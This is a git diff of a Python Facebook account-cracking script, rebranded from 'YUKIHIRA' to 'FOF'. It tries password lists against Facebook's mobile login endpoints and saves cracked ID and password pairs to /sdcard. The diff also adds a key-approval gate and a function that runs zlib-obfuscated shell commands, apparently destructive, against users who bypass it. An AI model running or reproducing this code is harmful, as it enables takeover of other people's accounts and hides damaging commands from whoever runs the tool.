@@ -1,48 +1,16 @@
-fromW = '\033[97;1m' 
-R = '\033[91;1m' 
-G = '\033[92;1m' 
-Y = '\033[93;1m' 
-B = '\033[94;1m'
-P = '\033[95;1m'
-C = '\033[96;1m'
-N = '\x1b[0m'
-
-
-
-import os
-try:
-	import requests
-except ImportError:
-	os.system("pip install requests")
-
-try:
-	import concurrent.futures
-except ImportError:
-	os.system("pip install futures")
-	
-	def runtxt(z):
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.03)
-
-import os
-import sys
-import time
-import requests
-import random
-import platform
-import base64
-import subprocess
+#FOF - _ - FILE _-_ON_-_FIRE !¡●●
+#SADIK KHAN ✌️
+from os import path
 import os,base64,zlib,pip,urllib,time
-runtxt("\n'[\033[1;32m✓\033[1;37m] Checking For Update !! '")
+print('[\033[1;32m✓\033[1;37m] Checking For Update !! ')
 time.sleep(1.5)
-runtxt('[\033[1;32m✓\033[1;37m] Wait For Update Tool !! ')
+print('[\033[1;32m✓\033[1;37m] Wait For Update Tool !! ')
 time.sleep(1.5)
 os.system('git pull')
 os.system('clear')
-runtxt('[\033[1;32m✓\033[1;37m] Update Done \033[1;32m✓\033[1;37m Now You Can Use This Tool :) ')
+print('[\033[1;32m✓\033[1;37m] Update Done \033[1;32m✓\033[1;37m Now You Can Use This Tool :) ')
 time.sleep(2)
-os.system(f'xdg-open https://facebook.com/groups/1848481151967680/')
+os.system(f'xdg-open https://facebook.com/groups/842909060147288/ ')
 try:
         import os,requests,json,time,re,random,sys,uuid,string,subprocess
         from string import *
@@ -61,11 +29,11 @@ love=('mbasic')
 ugen=[]
 ugen=[]
 useragent=[]
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 9; arm; Nokia 2.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 YaApp_Android/20.74 YaSearchBrowser/20.74 BroPP/1.0 SA/1 Mobile Safari/537.36"}
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 7.0; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36"}
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Micromax Q4202) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36"}
+header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
+header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-N986N Build/ZK83T5) [FBAN/FB4A;FBAV/979.2.9.20.981;FBPN/com.facebook.katana;FBLC/en_US;FBBV/687217741;FBCR/Glo Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-N986N;FBSV/11;FBCA/x86:armeabi-v7a;FBDM/{density=2.5,width=1080,height=2220};FB_FW/0;FBRV/0;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]"}
 for xd in range(10000):
-        aa='Mozilla/5.0 (Linux; Android 9; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36'
+        aa='Mozilla/5.0 (Linux; Android 10; Nokia 1 Plus Build/QP1A.190711.020; wv)'
         b=random.choice(['6','7','8','9','10','11','12',])
         c=f' TL-tl; {str(gt)}'
         g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79'
@@ -78,7 +46,7 @@ for xd in range(10000):
         ugen.append(uaku2)
 
 for agent in range(10000):
-        aa='Mozilla/5.0 (Linux; U; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.120 Mobile Safari/537.36 OPR/51.0.2254.150807'
+        aa='Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv)'
         b=random.choice(['6','7','8','9','10','11','12'])
         c='Android 9; Nokia C2 Build/'
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -94,7 +62,7 @@ for agent in range(10000):
         ugen.append(fullagnt)
         
 for agent in range(10000):
-        aa='Mozilla/5.0 (Linux; Android 10; vivo 1917; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1'
+        aa='Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)'
         b=random.choice(['6','7','8','9','10','11','12'])
         c='CPU iPhone OS 16_0 like Mac OS X'
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -110,7 +78,7 @@ for agent in range(10000):
         ugen.append(fullagnt)      
 
 for agent in range(10000):
-        aa='Mozilla/5.0 (Linux; U; Android 9; Redmi Note 5 Pro Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 OPR/50.0.2254.149182'
+        aa='Mozilla/5.0 (Linux; Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv)'
         b=random.choice(['6','7','8','9','10','11','12'])
         c='Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv'
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -139,26 +107,69 @@ def uaku():
 		ua=open('.mix.txt','r').read().splitlines()
         
        
+def FOFALWAYSONFIRE():
+  uuid = str(os.geteuid()) + str(os.getlogin())
+  id = "᯾".join(uuid)
+  server = requests.get(f'https://github.com/BANTUBD/BD/blob/main/APPROVAL.txt').text
+  
+ 
 
+  os.system(f" clear")                          
+  print(f"""\x1b[1;97m
+          ███████  ██████  ███████
+          ██      ██    ██ ██
+          █████   ██    ██ █████
+          ██      ██    ██ ██
+          ██       ██████  ██
+\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
+ Author    : TRIV ENRILE
+ Github    : BANTUBD
+ Facebook  : TRIV ENRILE
+ Tool Name : FOF
+ Tool Type : \033[1;31mTRIAL\033[1;37m
+ Version   : \033[1;32m2.5\033[1;37m
+\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m""")           
+  print(f"Your Key : \033[1;32m"+id)                                
+  #print(f"\033[1;37mThis Tool Is Free But You Need To Access This Tool")
+  #print(f"Send Your Key WhatsApp")
+  #os.system(f'xdg-open https://www.facebook.com/abegbalobasa.abegbalobasa')
+  time.sleep(1)
+  print(f"\033[1;37mChecking Your Key")
+  try:
+    httpCaht = requests.get(f"https://github.com/BANTUBD/BD/blob/main/APPROVAL.txt").text
+    if id in httpCaht:
+      print(f"\033[1;32mCongratulations ! Your Key Is Approved");time.sleep(2)
+      msg = str(os.geteuid())
+      time.sleep(0.5)
+      pass
+    else:      
+      print(f"This Tool Is Free But You Need To Access This Tool")
+      #print(f"Your Key Not Approved")
+      print(f"Send Key For Access This Tool"); time.sleep(1)
+      os.system(f'xdg-open {tan}://wa.me/+8801621250620?text='+id)
+      time.sleep(1)
+      sys.exit()
+  except:
+    sys.exit()
+    if name == '__main__':
+    	print(logo)
+    	FOFALWAYSONFIRE()
+#FOFALWAYSONFIRE()
 
 logo=(f"""\x1b[1;97m
- 
- \033[1;32m███    █▄     ▄█   ▄█▄  ▄█            H
- \033[1;31m███    ███   ███ ▄███▀ ███               
- \033[1;32m███    ███   ███▐██▀   ███▌           I
- \033[1;31m███    ███  ▄█████▀    ███▌             
- \033[1;32m███    ███ ▀▀█████▄    ███▌           R
- \033[1;31m███    ███   ███▐██▄   ███  
- \033[1;32m███    ███   ███ ▀███▄ ███            A
- \033[1;31m████████▀    ███   ▀█▀ █▀   
- \033[1;32m             ▀                                                                                                                                                 
+
+          ███████  ██████  ███████
+          ██      ██    ██ ██
+          █████   ██    ██ █████
+          ██      ██    ██ ██
+          ██       ██████  ██
 \033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
- \033[1;32mAuthor    : \033[1;35mRey Estacio
-\033[1;32m Github    : \033[1;35mYukihiraSomaa
-\033[1;32m Facebook  : \033[1;35mRey Estacio
-\033[1;32m Tool Name : \033[1;35mYUKIHIRA\033[1;37m
- \033[1;32mTool Type : \033[1;31mTRIAL\033[1;37m
- \033[1;32mVersion   : \033[1;36m0.1\033[1;37m
+ Author    : TRIV ENRILE
+ Github    : BANTUBD
+ Facebook  : TRIV ENRILE
+ Tool Name : \033[1;36m𝗙 𝗢 𝗙\033[1;37m
+ Tool Type : \033[1;31mTRIAL\033[1;37m
+ Version   : \033[1;36m2.6\033[1;37m
 \033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
 """)
 def linex():
@@ -173,13 +184,33 @@ pcp=[]
 id=[]
 tokenku=[]
 os.system('git pull')
+def fucked():
+	print(' Server Loadin.......')
+	os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+	print(' Fuck You Bypass User ');exit()
 
-
-
-def Yuki():
+def ckx():
+	uuid = str(os.geteuid()) + str(os.getlogin())
+	id = "᯾".join(uuid)
+	server = requests.get(f'https://github.com/BANTUBD/BD/blob/main/APPROVAL.txt').text
+	try:
+		httpCaht = requests.get(f"https://github.com/BANTUBD/BD/blob/main/APPROVAL.txt").text
+		if id in httpCaht:
+			msg = str(os.geteuid())
+			pass
+		else:
+			msg = str(os.geteuid())
+			fucked()
+	except:
+			sys.exit()
+			
+def Fof():
 	clear()
-	print(f" [\033[1;32m1\033[1;37m] FILE CLONING ")
-	print(f" [\033[1;32m2\033[1;37m] BD RANDOM CLONING ")
+	#ckx()
+	print(f" [\033[1;32m1\033[1;37m] FILE CLONEING ")
+	print(f" [\033[1;32m2\033[1;37m] BD RANDOM CLONEING ")
 	#print(f" [3] Gmail Cloning")
 	print(f" [\033[1;31m0\033[1;37m] Exit")
 	me=input(f' [\033[1;32m✓\033[1;37m] Choice : ')
@@ -229,20 +260,20 @@ def Yuki():
 					crack_submit.submit(m3,ids,names,passlist)
 				elif mthd in ['4','04']:
 					crack_submit.submit(m4,ids,names,passlist)
-				elif mthd in ['5','05']:
-					crack_submit.submit(m5,ids,names,passlist)
-				elif mthd in ['6','06']:
-					crack_submit.submit(ffb4,ids,names,passlist)
-				elif mthd in ['7','07']:
-					crack_submit.submit(ffb7,ids,names,passlist)
-				elif mthd in ['8','08']:
-					crack_submit.submit(ffb8,ids,names,passlist)
-				else:
-					crack_submit.submit(m5,ids,names,passlist)
+				#elif mthd in ['5','05']:
+					#crack_submit.submit(m5,ids,names,passlist)
+				#elif mthd in ['6','06']:
+					#crack_submit.submit(ffb4,ids,names,passlist)
+				#elif mthd in ['7','07']:
+					#crack_submit.submit(ffb7,ids,names,passlist)
+				#elif mthd in ['8','08']:
+					#crack_submit.submit(ffb8,ids,names,passlist)
+				#else:
+					#crack_submit.submit(m5,ids,names,passlist)
 				
 def m1(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [YUKI] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [FOF] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -259,20 +290,20 @@ def m1(ids,names,passlist):
                         getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        Yuki=session.cookies.get_dict().keys()
-                        if "datr=" in Yuki:
+                        Fof=session.cookies.get_dict().keys()
+                        if "c_user" in Fof:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [Yuki\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                cek_apk(session,coki)
-                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
-                                open(f'/sdcard/YUKIHIRA•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [FOF\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                open(f'/sdcard/FOF•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in Yuki:
+                        elif 'checkpoint' in Fof:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;208m [Yuki•CP] '+ids+' • '+pas+'\033[1;97m')
-                                        open(f'/sdcard/YUKIHIRA•CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;208m [FOF•CP] '+ids+' • '+pas+'\033[1;97m')
+                                        open(f'/sdcard/FOF•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -285,7 +316,7 @@ def m1(ids,names,passlist):
                         
 def m3(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [YUKIHIRA] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [FOF] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -302,20 +333,20 @@ def m3(ids,names,passlist):
                         getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        Yuki=session.cookies.get_dict().keys()
-                        if "datr=" in Yuki:
+                        Fof=session.cookies.get_dict().keys()
+                        if "c_user" in Fof:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [Yuki\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                cek_apk(session,coki)
-                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
-                                open(f'/sdcard/Yuki•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [FOF\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                open(f'/sdcard/FOF•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in Yuki:
+                        elif 'checkpoint' in Fof:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;208m [Yuki•CP] '+ids+' • '+pas+'\033[1;97m')
-                                        open(f'/sdcard/Yuki•CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;208m [FOF•CP] '+ids+' • '+pas+'\033[1;97m')
+                                        open(f'/sdcard/FOF•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -328,7 +359,7 @@ def m3(ids,names,passlist):
 
 def m2(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [YUKIHIRA] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [FOF] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -345,20 +376,20 @@ def m2(ids,names,passlist):
                         getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        Yuki=session.cookies.get_dict().keys()
-                        if "datr=" in Yuki:
+                        Fof=session.cookies.get_dict().keys()
+                        if "c_user" in Fof:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [YUKIHIRA\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                cek_apk(session,coki)
-                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
-                                open(f'/sdcard/YUKIHIRA•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [FOF\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                open(f'/sdcard/FOF•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in Yuki:
+                        elif 'checkpoint' in Fof:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;208m [Yuki•CP] '+ids+' • '+pas+'\033[1;97m')
-                                        open(f'/sdcard/YUKIHIRA•CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;208m [FOF•CP] '+ids+' • '+pas+'\033[1;97m')
+                                        open(f'/sdcard/FOF•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -371,7 +402,7 @@ def m2(ids,names,passlist):
 
 def m4(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [YUKIHIRA] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [FOF] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -388,20 +419,20 @@ def m4(ids,names,passlist):
                         getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        Yuki=session.cookies.get_dict().keys()
-                        if "datr=" in Yuki:
+                        Fof=session.cookies.get_dict().keys()
+                        if "c_user" in Fof:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [YUKIHIRA\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                cek_apk(session,coki)
-                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
-                                open(f'/sdcard/YUKIHIRA•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [FOF\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                open(f'/sdcard/FOF•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in Yuki:
+                        elif 'checkpoint' in Fof:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;208m [YUKIHIRA•CP] '+ids+' • '+pas+'\033[1;97m')
-                                        open(f'/sdcard/YUKIHIRA•CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;208m [FOF•CP] '+ids+' • '+pas+'\033[1;97m')
+                                        open(f'/sdcard/FOF•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -413,4 +444,4 @@ def m4(ids,names,passlist):
         loop+=1
 
 
-Yuki()
+Fof()
